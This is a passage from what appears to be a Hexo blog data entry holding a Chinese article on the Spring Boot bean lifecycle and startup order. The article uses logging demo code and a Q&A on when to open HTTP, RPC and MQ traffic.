Spring的。而在此之前，Spring Event订阅机制还未初始化完成。所以如果有 MQ、Rpc 入口流量在此之前开启，Spring Event就可能出问题！\n\n> 所以强烈建议 Http、MQ、Rpc 入口流量在 `SmartInitializingSingleton` 之后开启流量。\n\nHttp、MQ、Rpc 入口流量必须在 `SmartInitializingSingleton` 之后开启流量。\n\n**15.Spring 提供的扩展点，在所有单例Bean的 EventListener等组件全部启动完成后，即Spring启动完成，则执行 start 方法。在这个位置适合开启入口流量！**\n\nHttp、MQ、Rpc 入口流量适合 在 `SmartLifecyle` 中开启\n\n**16.发布 ContextRefreshedEvent 方法**\n\n该事件会执行多次，在 `Spring Refresh` 执行完成后，就会发布该事件！\n\n**17.注册和初始化 Spring MVC**\n\nSpringBoot 应用，在父级 Spring启动完成后，会尝试启动 内嵌式 tomcat容器。在此之前，SpringBoot会初始化 SpringMVC 和注册`DispatcherServlet`到Web容器。\n\n**18.Tomcat/Jetty 容器开启端口**\n\nSpringBoot 调用内嵌式容器，会开启并监听端口，此时Http流量就开启了。\n\n**19.应用启动完成后，执行 CommandLineRunner**\n\nSpringBoot 特有的机制，待所有的完全执行完成后，会执行该接口 run方法。值得一提的是，由于此时Http流量已经开启，如果此时进行本地缓存初始化、预热缓存等，稍微有些晚了！在这个间隔期，可能缓存还未就绪！\n\n所以预热缓存的时机应该发生在 入口流量开启之前，比较合适的机会是在 Bean初始化的阶段。虽然 在Bean初始化时 Spring尚未完成启动，但是调用 Bean预热缓存也是可以的。但是注意：不要在 Bean初始化时 使用 Spring Event，因为它还未完成初始化 。\n\n回答 关于 Spring 启动原理的若干问题\n----------------------\n\n**1.init-method、PostConstruct、afterPropertiesSet 三个方法的执行顺序。**\n\n回答：`PostConstruct`，`afterPropertiesSet`，`init-method`\n\n**2.有两个 Bean声明了初始化方法。A使用 PostConstruct注解声明，B使用 init-method 声明。Spring一定先执行 A 的PostConstruct 方法吗？**\n\n回答：Spring 会循环初始化Bean实例，初始化完成1个Bean，再初始化下一个Bean。Spring并没有使用这种机制启动，即所有的Bean先执行 `PostConstruct`，再统一执行`afterProperfiesSet`。\n\n此外，A、B两个Bean的初始化顺序不确定，谁先谁后不确定。无法保证 A 的`PostConstruct` 一定先执行。除非使用 Order注解，声明Bean的初始化顺序！\n\n**3.Spring 何时装配Autowire属性，PostConstruct方法中引用 Autowired 字段是否会空指针?**\n\nAutowired装配依赖发生在 `PostConstruct`之前，不会出现空指针！\n\n**4.PostConstruct 中方法依赖ApplicationContextAware拿到 ApplicationContext，两者的顺序谁先谁后？是否会出现空指针!**\n\n`ApplicationContextAware` 会先执行，不会出现空指针！但是当Autowired没有找到对应的依赖，并且声明了非强制依赖时，该字段会为空，有潜在 空指针风险。\n\n**5.项目应该如何监听 Spring 的启动就绪事件。**\n\n通过`SmartLifecyle start`方法，监听Spring就绪 。适合在此开启入口流量！\n\n**6.项目如何监听Spring 刷新事件。**\n\n监听`Spring Event ContextRefreshedEvent`\n\n**7.Spring就绪事件和刷新事件的执行顺序和区别。**\n\nSpring就绪事件会先于 刷新事件。两者都可能多次执行，要确保方法的幂等处理，避免重复注册问题\n\n**8.Http 流量入口何时启动完成。**\n\nSpringBoot 最后阶段，启动完成Spring 上下文，才开启Http入口流量，此时 SmartLifecycle#start 已执行。所有单例Bean和SpringEvent等组件都已经就绪！\n\n**9.项目中在 init-method 方法中注册 Rpc是否合理？什么是合理的时机？**\n\ninit 开启Rpc流量非常不合理。因为Spring尚未启动完成，包括 Spring Event尚未就绪！\n\n**10.项目中在 init-method 方法中注册 MQ消费组是否合理？什么是合理的时机？**\n\ninit 开启 MQ 流量非常不合理。因为Spring尚未启动完成，包括 Spring Event尚未就绪！\n\n**11.Spring还未完全启动，在 PostConstruct 中调用 getBeanByAnnotation能否获得准确的结果？**\n\n虽然未启动完成，但是Spring执行该`getBeanByAnnotation`方法时，会率先检查 Bean定义，如果Bean定义对应的 Bean尚未初始化，则初始化这些Bean。所以即便是Spring初始化过程中调用，调用结果是准确的。\n\n源码级别介绍\n------\n\n#### SmartInitializingSingleton 接口的执行位置\n\n下图代码说明了，Spring在初始化全部 单例Bean以后，会执行 `SmartInitializingSingleton` 接口。\n\n![](./2024/06/16/一张长图透彻理解SpringBoot启动原理/3.png)\n#### Autowired 何时装配Bean的依赖\n\n在Bean实例化之后，但初始化之前，`AutowiredAnnotationBeanPostProcessor` 会注入Autowired字段。\n\n![](./2024/06/16/一张长图透彻理解SpringBoot启动原理/4.png)\n#### SpringBoot 何时开启Http端口\n\n下图代码中可以看到，SpringBoot会首先启动 Spring上下文，完成后才启动 嵌入式Web容器，初始化SpringMVC，监听端口\n\n![](./2024/06/16/一张长图透彻理解SpringBoot启动原理/5.png)\n#### Spring 初始化Bean的关键代码\n\n下图我加了注释，Spring初始化Bean的关键代码，全在 这个方法里，感兴趣的可以自行查阅代码 。\n\nAbstractAutowireCapableBeanFactory#initializeBean\n\n![](./2024/06/16/一张长图透彻理解SpringBoot启动原理/6.png)\n#### Spring CommandLineRunner 执行位置\n\nSpring Boot外部，当启动完Spring上下文以后，最后才启动 `CommandLineRunner`。\n\n![](./2024/06/16/一张长图透彻理解SpringBoot启动原理/7.png)\n总结\n--\n\nSpringBoot 会在Spring完全启动完成后，才开启Http流量。这给了我们启示：应该在Spring启动完成后开启入口流量。Rpc和 MQ流量 也应该如此，所以建议大家 在 `SmartLifecype` 或者 `ContextRefreshedEvent` 等位置 注册服务，开启流量。\n\n例如Spring Cloud Eureka 服务发现组件，就是在 `SmartLifecype`中注册服务的！\n\n整理10 个小时写完本篇文章，希望大家有所收获。","source":"_posts/一张长图透彻理解SpringBoot启动原理.md","raw":"---\ntitle: 一张长图透彻理解SpringBoot启动原理\ndate: 2024-06-16 22:04:29\ntags: springboot启动原理\ncategories: 面试\n---\n\n虽然Java程序员大部分工作都是CRUD，但是工作中常用的中间件必须和Spring集成，如果不知道Spring的原理，很难理解这些中间件和框架的原理。\n\n一张长图透彻解释 Spring启动顺序\n-------------------\n\n![](./2024/06/16/一张长图透彻理解SpringBoot启动原理/1.png)\n\n测试对Spring启动原理的理解程度\n------------------\n\n我举个例子，测试一下，你对Spring启动原理的理解程度。\n\n*   Rpc框架和Spring的集成问题。Rpc框架何时注册暴露服务，在哪个Spring扩展点注册呢？init-method 中行不行？\n\n*   MQ 消费组和Spring的集成问题。MQ消费者何时开始消费，在哪个Spring扩展点”注册“自己？init-method 中行不行？\n\n*   SpringBoot 集成Tomcat问题。如果出现已开启Http流量，Spring还未启动完成，怎么办？Tomcat何时开启端口，对外服务？\n\n\nSpringBoot项目常见的流量入口无外乎 Rpc、Http、MQ 三种方式。一名合格的架构师必须精通服务的入口流量何时开启，如何正确开启？最近我遇到的两次线上故障都和Spring启动过程相关。\n\n故障的具体表现是：Kafka消费组已经开始消费，已开启流量，然而Spring 还未启动完成。因为业务代码中使用的Spring Event事件订阅组件还未启动（订阅者还未注册到Spring），所以处理异常，出了线上故障。根本原因是————项目在错误的时机开启 MQ 流量，然而Spring还未启动完成，导致出现故障。\n\n正确的做法是：项目在Spring启动完成后开启入口流量，然而我司的Kafka消费组 在Spring `init-method bean` 实例化阶段就开启了流量，导致故障发生。出现这样的问题，说明项目初期的程序员没有深入理解Spring的启动原理。\n\n接下来，我再次抛出 11 个问题，说明这个问题————深入理解Spring启动原理的重要性。\n\n**1、** Spring还未完全启动，在`PostConstruct`中调用`getBeanByAnnotation`能否获得准确的结果？；  \n**2、** 项目应该如何监听Spring的启动就绪事件？；  \n**3、** 项目如何监听Spring刷新事件？；  \n**4、** Spring就绪事件和刷新事件的执行顺序和区别？；  \n**5、** Http流量入口何时启动完成？；  \n**6、** 项目中在`init-method`方法中注册Rpc是否合理？什么是合理的时机？；  \n**7、** 项目中在`init-method`方法中注册MQ消费组是否合理？什么是合理的时机？；  \n**8、** `PostConstruct`中方法依赖`ApplicationContextAware`拿到`ApplicationContext`，两者的顺序谁先谁后？是否会出现空指针!；  \n**9、** `init-method`、`PostConstruct`、`afterPropertiesSet`三个方法的执行顺序?；  \n**10、** 有两个Bean声明了初始化方法A使用`PostConstruct`注解声明，B使用`init-method`声明Spring一定先执行A的`PostConstruct`方法吗？；  \n**11、** Spring何时装配Autowire属性，`PostConstruct`方法中引用Autowired字段什么场景会空指针?；\n\n精通Spring 启动原理，以上问题则迎刃而解。接下来，大家一起学习Spring的启动原理，看看Spring的扩展点分别在何时执行。\n\n一起数数 Spring启动过程的扩展点有几个？\n-----------------------\n\nSpring的扩展点极多，这里为了讲清楚启动原理，所以只列举和启动过程有关的扩展点。\n\n**1、** `BeanFactoryAware`可在Bean中获取`BeanFactory`实例；  \n**2、** `ApplicationContextAware`可在Bean中获取`ApplicationContext`实例；  \n**3、** `BeanNameAware`可以在Bean中得到它在IOC容器中的Bean的实例的名字；  \n**4、** `ApplicationListener`可监听`ContextRefreshedEvent`等；  \n**5、** `CommandLineRunner`整个项目启动完毕后，自动执行；  \n6\\.  SmartLifecycle#start 在Spring Bean实例化完成后，执行start 方法。**7、** 使用`@PostConstruct`注解，用于Bean实例初始化；  \n**8、** 实现`InitializingBean`接口，用于Bean实例初始化；  \n**9、** xml中声明`init-method`方法，用于Bean实例初始化；  \n**10、** `Configuration`配置类通过@Bean注解注册Bean到Spring；  \n**11、** `BeanPostProcessor`在Bean的初始化前后，植入扩展点！；  \n**12、** `BeanFactoryPostProcessor`在`BeanFactory`创建后植入扩展点！；\n\n通过打印日志学习Spring的执行顺序\n-------------------\n\n首先我们先通过 代码实验，验证一下以上扩展点的执行顺序。\n\n**1、** 声明`TestSpringOrder`分别继承以下接口，并且在接口方法实现中，日志打印该接口的名称；\n\n```\npublic class TestSpringOrder implements  \n      ApplicationContextAware,  \n      BeanFactoryAware,   \n      InitializingBean,   \n      SmartLifecycle,   \n      BeanNameAware,   \n      ApplicationListener<ContextRefreshedEvent>,   \n      CommandLineRunner,  \n      SmartInitializingSingleton {  \n  \n\n```\n```\n@Override  \npublic void afterPropertiesSet() throws Exception {  \n   log.error(\"启动顺序:afterPropertiesSet\");  \n}  \n  \n@Override  \npublic void setApplicationContext(ApplicationContext applicationContext) throws BeansException {  \n   log.error(\"启动顺序:setApplicationContext\");  \n}  \n  \n\n```\n\n**2、** `TestSpringOrder`使用`PostConstruct`注解初始化，声明`init-method`方法初始化；\n\n```\n@PostConstruct  \npublic void postConstruct() {  \n   log.error(\"启动顺序:post-construct\");  \n}  \n  \npublic void initMethod() {  \n   log.error(\"启动顺序:init-method\");  \n}  \n  \n\n```\n\n**3、** 新建`TestSpringOrder2`继承；\n\n```\npublic class TestSpringOrder3 implements  \n         BeanPostProcessor,   \n         BeanFactoryPostProcessor {  \n   @Override  \n   public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException {  \n      log.error(\"启动顺序:BeanPostProcessor postProcessBeforeInitialization beanName:{}\", beanName);  \n      return bean;  \n   }  \n  \n   @Override  \n   public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException {  \n      log.error(\"启动顺序:BeanPostProcessor postProcessAfterInitialization beanName:{}\", beanName);  \n      return bean;  \n   }  \n  \n   @Override  \n   public void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) throws BeansException {  \n      log.error(\"启动顺序:BeanFactoryPostProcessor postProcessBeanFactory \");  \n   }  \n}  \n  \n\n```\n\n执行以上代码后，可以在日志中看到启动顺序！\n\n#### 实际的执行顺序\n\n```\n2023-11-25 18:10:53,748 [main] ERROR (TestSpringOrder3:37) - 启动顺序:BeanFactoryPostProcessor postProcessBeanFactory   \n2023-11-25 18:10:59,299 [main] ERROR (TestSpringOrder:53) - 启动顺序:构造函数 TestSpringOrder  \n2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:127) - 启动顺序: Autowired  \n2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:129) - 启动顺序:setBeanName  \n2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:111) - 启动顺序:setBeanFactory  \n2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:121) - 启动顺序:setApplicationContext  \n2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder3:25) - 启动顺序:BeanPostProcessor postProcessBeforeInitialization beanName:testSpringOrder  \n2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:63) - 启动顺序:post-construct  \n2023-11-25 18:10:59,317 [main] ERROR (TestSpringOrder:116) - 启动顺序:afterPropertiesSet  \n2023-11-25 18:10:59,317 [main] ERROR (TestSpringOrder:46) - 启动顺序:init-method  \n2023-11-25 18:10:59,320 [main] ERROR (TestSpringOrder3:31) - 启动顺序:BeanPostProcessor postProcessAfterInitialization beanName:testSpringOrder  \n2023-11-25 18:17:21,563 [main] ERROR (SpringOrderConfiguartion:21) - 启动顺序: @Bean 注解方法执行  \n2023-11-25 18:17:21,668 [main] ERROR (TestSpringOrder:58) - 启动顺序:SmartInitializingSingleton  \n2023-11-25 18:17:21,675 [main] ERROR (TestSpringOrder:74) - 启动顺序:start  \n2023-11-25 18:17:23,508 [main] ERROR (TestSpringOrder:68) - 启动顺序:ContextRefreshedEvent  \n2023-11-25 18:17:23,574 [main] ERROR (TestSpringOrder:79) - 启动顺序:CommandLineRunner  \n  \n\n```\n\n我通过在以上扩展点 添加 debug 断点，调试代码，整理出 Spring启动原理的 长图。过程省略…………\n\n一张长图透彻解释 Spring启动顺序\n-------------------\n\n![](./2024/06/16/一张长图透彻理解SpringBoot启动原理/2.png)\n#### 实例化和初始化的区别\n\n`new TestSpringOrder()`：new 创建对象实例，即为实例化一个对象；执行该Bean的 `init-method` 等方法 为初始化一个Bean。注意初始化和实例化的区别。\n\nSpring 重要扩展点的启动顺序\n-----------------\n\n**1.BeanFactoryPostProcessor**\n\nBeanFactory初始化之后，所有的Bean定义已经被加载，但Bean实例还没被创建（不包括`BeanFactoryPostProcessor`类型）。Spring IoC容器允许`BeanFactoryPostProcessor`读取配置元数据，修改bean的定义，Bean的属性值等。\n\n**2.实例化Bean**\n\nSpring 调用java反射API 实例化 Bean。等同于 `new TestSpringOrder()`;\n\n**3.Autowired 装配依赖**\n\nAutowired是 借助于 `AutowiredAnnotationBeanPostProcessor` 解析 Bean 的依赖，装配依赖。如果被依赖的Bean还未初始化，则先初始化 被依赖的Bean。在 Bean实例化完成后，Spring将首先装配Bean依赖的属性。\n\n**4.BeanNameAware**\n\n`setBeanName`\n\n**5.BeanFactoryAware**\n\n`setBeanFactory`\n\n**6.ApplicationContextAware setApplicationContext**\n\n在Bean实例化前，会率先设置Aware接口，例如 `BeanNameAware` `BeanFactoryAware` `ApplicationContextAware` 等\n\n**7.BeanPostProcessor postProcessBeforeInitialization**\n\n如果我想在 bean初始化方法前后要添加一些自己逻辑处理。可以提供 `BeanPostProcessor`接口实现类，然后注册到Spring IoC容器中。在此接口中，可以创建Bean的代理，甚至替换这个Bean。\n\n**8.PostConstruct 执行**\n\n接下来Spring会依次调用 Bean实例初始化的 三大方法。\n\n**9.InitializingBean**\n\n`afterPropertiesSet`\n\n**10.init-method**\n\n方法执行\n\n**11.BeanPostProcessor postProcessAfterInitialization**\n\n在Spring 对Bean的初始化方法执行完成后，执行该方法\n\n**12.其他Bean 实例化和初始化**\n\nSpring 会循环初始化Bean。直至所有的单例Bean都完成初始化\n\n**13.所有单例Bean 初始化完成后**\n\n**14.SmartInitializingSingleton Bean实例化后置处理**\n\n该接口的执行时机在 所有的单例Bean执行完成后。例如Spring 事件订阅机制的 `EventListener`注解，所有的订阅者 都是 在这个位置被注册进 Spring的。而在此之前，Spring Event订阅机制还未初始化完成。所以如果有 MQ、Rpc 入口流量在此之前开启，Spring Event就可能出问题！\n\n> 所以强烈建议 Http、MQ、Rpc 入口流量在 `SmartInitializingSingleton` 之后开启流量。\n\nHttp、MQ、Rpc 入口流量必须在 `SmartInitializingSingleton` 之后开启流量。\n\n**15.Spring 提供的扩展点，在所有单例Bean的 EventListener等组件全部启动完成后，即Spring启动完成，则执行 start 方法。在这个位置适合开启入口流量！**\n\nHttp、MQ、Rpc 入口流量适合 在 `SmartLifecyle` 中开启\n\n**16.发布 ContextRefreshedEvent 方法**\n\n该事件会执行多次，在 `Spring Refresh` 执行完成后，就会发布该事件！\n\n**17.注册和初始化 Spring MVC**\n\nSpringBoot 应用，在父级 Spring启动完成后，会尝试启动 内嵌式 tomcat容器。在此之前，SpringBoot会初始化 SpringMVC 和注册`DispatcherServlet`到Web容器。\n\n**18.Tomcat/Jetty 容器开启端口**\n\nSpringBoot 调用内嵌式容器，会开启并监听端口，此时Http流量就开启了。\n\n**19.应用启动完成后，执行 CommandLineRunner**\n\nSpringBoot 特有的机制，待所有的完全执行完成后，会执行该接口 run方法。值得一提的是，由于此时Http流量已经开启，如果此时进行本地缓存初始化、预热缓存等，稍微有些晚了！在这个间隔期，可能缓存还未就绪！\n\n所以预热缓存的时机应该发生在 入口流量开启之前，比较合适的机会是在 Bean初始化的阶段。虽然 在Bean初始化时 Spring尚未完成启动，但是调用 Bean预热缓存也是可以的。但是注意：不要在 Bean初始化时 使用 Spring Event，因为它还未完成初始化 。\n\n回答 关于 Spring 启动原理的若干问题\n----------------------\n\n**1.init-method、PostConstruct、afterPropertiesSet 三个方法的执行顺序。**\n\n回答：`PostConstruct`，`afterPropertiesSet`，`init-method`\n\n**2.有两个 Bean声明了初始化方法。A使用 PostConstruct注解声明，B使用 init-method 声明。Spring一定先执行 A 的PostConstruct 方法吗？**\n\n回答：Spring 会循环初始化Bean实例，初始化完成1个Bean，再初始化下一个Bean。Spring并没有使用这种机制启动，即所有的Bean先执行 `PostConstruct`，再统一执行`afterProperfiesSet`。\n\n此外，A、B两个Bean的初始化顺序不确定，谁先谁后不确定。无法保证 A 的`PostConstruct` 一定先执行。除非使用 Order注解，声明Bean的初始化顺序！\n\n**3.Spring 何时装配Autowire属性，PostConstruct方法中引用 Autowired 字段是否会空指针?**\n\nAutowired装配依赖发生在 `PostConstruct`之前，不会出现空指针！\n\n**4.PostConstruct 中方法依赖ApplicationContextAware拿到 ApplicationContext，两者的顺序谁先谁后？是否会出现空指针!**\n\n`ApplicationContextAware` 会先执行，不会出现空指针！但是当Autowired没有找到对应的依赖，并且声明了非强制依赖时，该字段会为空，有潜在 空指针风险。\n\n**5.项目应该如何监听 Spring 的启动就绪事件。**\n\n通过`SmartLifecyle start`方法，监听Spring就绪 。适合在此开启入口流量！\n\n**6.项目如何监听Spring 刷新事件。**\n\n监听`Spring Event ContextRefreshedEvent`\n\n**7.Spring就绪事件和刷新事件的执行顺序和区别。**\n\nSpring就绪事件会先于 刷新事件。两者都可能多次执行，要确保方法的幂等处理，避免重复注册问题\n\n**8.Http 流量入口何时启动完成。**\n\nSpringBoot 最后阶段，启动完成Spring 上下文，才开启Http入口流量，此时 SmartLifecycle#start 已执行。所有单例Bean和SpringEvent等组件都已经就绪！\n\n**9.项目中在 init-method 方法中注册 Rpc是否合理？什么是合理的时机？**\n\ninit 开启Rpc流量非常不合理。因为Spring尚未启动完成，包括 Spring Event尚未就绪！\n\n**10.项目中在 init-method 方法中注册 MQ消费组是否合理？什么是合理的时机？**\n\ninit 开启 MQ 流量非常不合理。因为Spring尚未启动完成，包括 Spring Event尚未就绪！\n\n**11.Spring还未完全启动，在 PostConstruct 中调用 getBeanByAnnotation能否获得准确的结果？**\n\n虽然未启动完成，但是Spring执行该`getBeanByAnnotation`方法时，会率先检查 Bean定义，如果Bean定义对应的 Bean尚未初始化，则初始化这些Bean。所以即便是Spring初始化过程中调用，调用结果是准确的。\n\n源码级别介绍\n------\n\n#### SmartInitializingSingleton 接口的执行位置\n\n下图代码说明了，Spring在初始化全部 单例Bean以后，会执行 `SmartInitializingSingleton` 接口。\n\n![](./2024/06/16/一张长图透彻理解SpringBoot启动原理/3.png)\n#### Autowired 何时装配Bean的依赖\n\n在Bean实例化之后，但初始化之前，`AutowiredAnnotationBeanPostProcessor` 会注入Autowired字段。\n\n![](./2024/06/16/一张长图透彻理解SpringBoot启动原理/4.png)\n#### SpringBoot 何时开启Http端口\n\n下图代码中可以看到，SpringBoot会首先启动 Spring上下文，完成后才启动 嵌入式Web容器，初始化SpringMVC，监听端口\n\n![](./2024/06/16/一张长图透彻理解SpringBoot启动原理/5.png)\n#### Spring 初始化Bean的关键代码\n\n下图我加了注释，Spring初始化Bean的关键代码，全在 这个方法里，感兴趣的可以自行查阅代码 。\n\nAbstractAutowireCapableBeanFactory#initializeBean\n\n![](./2024/06/16/一张长图透彻理解SpringBoot启动原理/6.png)\n#### Spring CommandLineRunner 执行位置\n\nSpring Boot外部，当启动完Spring上下文以后，最后才启动 `CommandLineRunner`。\n\n![](./2024/06/16/一张长图透彻理解SpringBoot启动原理/7.png)\n总结\n--\n\nSpringBoot 会在Spring完全启动完成后，才开启Http流量。这给了我们启示：应该在Spring启动完成后开启入口流量。Rpc和 MQ流量 也应该如此，所以建议大家 在 `SmartLifecype` 或者 `ContextRefreshedEvent` 等位置 注册服务，开启流量。\n\n例如Spring Cloud Eureka 服务发现组件，就是在 `SmartLifecype`中注册服务的！\n\n整理10 个小时写完本篇文章，希望大家有所收获。","slug":"一张长图透彻理解SpringBoot启动原理","published":1,"updated":"2024-06-16T14:10:34.682Z","comments":1,"layout":"post","photos":[],"_id":"clylh1rye001dbsuhbrn8cg6p","content":"<p>虽然Java程序员大部分工作都是CRUD，但是工作中常用的中间件必须和Spring集成，如果不知道Spring的原理，很难理解这些中间件和框架的原理。</p>\n<h2 id=\"一张长图透彻解释-Spring启动顺序\"><a href=\"#一张长图透彻解释-Spring启动顺序\" class=\"headerlink\" title=\"一张长图透彻解释 Spring启动顺序\"></a>一张长图透彻解释 Spring启动顺序</h2><p><img src=\"/./2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/1.png\"></p>\n<h2 id=\"测试对Spring启动原理的理解程度\"><a href=\"#测试对Spring启动原理的理解程度\" class=\"headerlink\" title=\"测试对Spring启动原理的理解程度\"></a>测试对Spring启动原理的理解程度</h2><p>我举个例子，测试一下，你对Spring启动原理的理解程度。</p>\n<ul>\n<li><p>Rpc框架和Spring的集成问题。Rpc框架何时注册暴露服务，在哪个Spring扩展点注册呢？init-method 中行不行？</p>\n</li>\n<li><p>MQ 消费组和Spring的集成问题。MQ消费者何时开始消费，在哪个Spring扩展点”注册“自己？init-method 中行不行？</p>\n</li>\n<li><p>SpringBoot 集成Tomcat问题。如果出现已开启Http流量，Spring还未启动完成，怎么办？Tomcat何时开启端口，对外服务？</p>\n</li>\n</ul>\n<p>SpringBoot项目常见的流量入口无外乎 Rpc、Http、MQ 三种方式。一名合格的架构师必须精通服务的入口流量何时开启，如何正确开启？最近我遇到的两次线上故障都和Spring启动过程相关。</p>\n<p>故障的具体表现是：Kafka消费组已经开始消费，已开启流量，然而Spring 还未启动完成。因为业务代码中使用的Spring Event事件订阅组件还未启动（订阅者还未注册到Spring），所以处理异常，出了线上故障。根本原因是————项目在错误的时机开启 MQ 流量，然而Spring还未启动完成，导致出现故障。</p>\n<p>正确的做法是：项目在Spring启动完成后开启入口流量，然而我司的Kafka消费组 在Spring <code>init-method bean</code> 实例化阶段就开启了流量，导致故障发生。出现这样的问题，说明项目初期的程序员没有深入理解Spring的启动原理。</p>\n<p>接下来，我再次抛出 11 个问题，说明这个问题————深入理解Spring启动原理的重要性。</p>\n<p><strong>1、</strong> Spring还未完全启动，在<code>PostConstruct</code>中调用<code>getBeanByAnnotation</code>能否获得准确的结果？；<br><strong>2、</strong> 项目应该如何监听Spring的启动就绪事件？；<br><strong>3、</strong> 项目如何监听Spring刷新事件？；<br><strong>4、</strong> Spring就绪事件和刷新事件的执行顺序和区别？；<br><strong>5、</strong> Http流量入口何时启动完成？；<br><strong>6、</strong> 项目中在<code>init-method</code>方法中注册Rpc是否合理？什么是合理的时机？；<br><strong>7、</strong> 项目中在<code>init-method</code>方法中注册MQ消费组是否合理？什么是合理的时机？；<br><strong>8、</strong> <code>PostConstruct</code>中方法依赖<code>ApplicationContextAware</code>拿到<code>ApplicationContext</code>，两者的顺序谁先谁后？是否会出现空指针!；<br><strong>9、</strong> <code>init-method</code>、<code>PostConstruct</code>、<code>afterPropertiesSet</code>三个方法的执行顺序?；<br><strong>10、</strong> 有两个Bean声明了初始化方法A使用<code>PostConstruct</code>注解声明，B使用<code>init-method</code>声明Spring一定先执行A的<code>PostConstruct</code>方法吗？；<br><strong>11、</strong> Spring何时装配Autowire属性，<code>PostConstruct</code>方法中引用Autowired字段什么场景会空指针?；</p>\n<p>精通Spring 启动原理，以上问题则迎刃而解。接下来，大家一起学习Spring的启动原理，看看Spring的扩展点分别在何时执行。</p>\n<h2 id=\"一起数数-Spring启动过程的扩展点有几个？\"><a href=\"#一起数数-Spring启动过程的扩展点有几个？\" class=\"headerlink\" title=\"一起数数 Spring启动过程的扩展点有几个？\"></a>一起数数 Spring启动过程的扩展点有几个？</h2><p>Spring的扩展点极多，这里为了讲清楚启动原理，所以只列举和启动过程有关的扩展点。</p>\n<p><strong>1、</strong> <code>BeanFactoryAware</code>可在Bean中获取<code>BeanFactory</code>实例；<br><strong>2、</strong> <code>ApplicationContextAware</code>可在Bean中获取<code>ApplicationContext</code>实例；<br><strong>3、</strong> <code>BeanNameAware</code>可以在Bean中得到它在IOC容器中的Bean的实例的名字；<br><strong>4、</strong> <code>ApplicationListener</code>可监听<code>ContextRefreshedEvent</code>等；<br><strong>5、</strong> <code>CommandLineRunner</code>整个项目启动完毕后，自动执行；<br>6.  SmartLifecycle#start 在Spring Bean实例化完成后，执行start 方法。<strong>7、</strong> 使用<code>@PostConstruct</code>注解，用于Bean实例初始化；<br><strong>8、</strong> 实现<code>InitializingBean</code>接口，用于Bean实例初始化；<br><strong>9、</strong> xml中声明<code>init-method</code>方法，用于Bean实例初始化；<br><strong>10、</strong> <code>Configuration</code>配置类通过@Bean注解注册Bean到Spring；<br><strong>11、</strong> <code>BeanPostProcessor</code>在Bean的初始化前后，植入扩展点！；<br><strong>12、</strong> <code>BeanFactoryPostProcessor</code>在<code>BeanFactory</code>创建后植入扩展点！；</p>\n<h2 id=\"通过打印日志学习Spring的执行顺序\"><a href=\"#通过打印日志学习Spring的执行顺序\" class=\"headerlink\" title=\"通过打印日志学习Spring的执行顺序\"></a>通过打印日志学习Spring的执行顺序</h2><p>首先我们先通过 代码实验，验证一下以上扩展点的执行顺序。</p>\n<p><strong>1、</strong> 声明<code>TestSpringOrder</code>分别继承以下接口，并且在接口方法实现中，日志打印该接口的名称；</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">public class TestSpringOrder implements  </span><br><span class=\"line\">      ApplicationContextAware,  </span><br><span class=\"line\">      BeanFactoryAware,   </span><br><span class=\"line\">      InitializingBean,   </span><br><span class=\"line\">      SmartLifecycle,   </span><br><span class=\"line\">      BeanNameAware,   </span><br><span class=\"line\">      ApplicationListener&lt;ContextRefreshedEvent&gt;,   </span><br><span class=\"line\">      CommandLineRunner,  </span><br><span class=\"line\">      SmartInitializingSingleton &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">@Override  </span><br><span class=\"line\">public void afterPropertiesSet() throws Exception &#123;  </span><br><span class=\"line\">   log.error(&quot;启动顺序:afterPropertiesSet&quot;);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">@Override  </span><br><span class=\"line\">public void setApplicationContext(ApplicationContext applicationContext) throws BeansException &#123;  </span><br><span class=\"line\">   log.error(&quot;启动顺序:setApplicationContext&quot;);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><strong>2、</strong> <code>TestSpringOrder</code>使用<code>PostConstruct</code>注解初始化，声明<code>init-method</code>方法初始化；</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">@PostConstruct  </span><br><span class=\"line\">public void postConstruct() &#123;  </span><br><span class=\"line\">   log.error(&quot;启动顺序:post-construct&quot;);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">public void initMethod() &#123;  </span><br><span class=\"line\">   log.error(&quot;启动顺序:init-method&quot;);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><strong>3、</strong> 新建<code>TestSpringOrder2</code>继承；</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">public class TestSpringOrder3 implements  </span><br><span class=\"line\">         BeanPostProcessor,   </span><br><span class=\"line\">         BeanFactoryPostProcessor &#123;  </span><br><span class=\"line\">   @Override  </span><br><span class=\"line\">   public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException &#123;  </span><br><span class=\"line\">      log.error(&quot;启动顺序:BeanPostProcessor postProcessBeforeInitialization beanName:&#123;&#125;&quot;, beanName);  </span><br><span class=\"line\">      return bean;  </span><br><span class=\"line\">   &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">   @Override  </span><br><span class=\"line\">   public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException &#123;  </span><br><span class=\"line\">      log.error(&quot;启动顺序:BeanPostProcessor postProcessAfterInitialization beanName:&#123;&#125;&quot;, beanName);  </span><br><span class=\"line\">      return bean;  </span><br><span class=\"line\">   &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">   @Override  </span><br><span 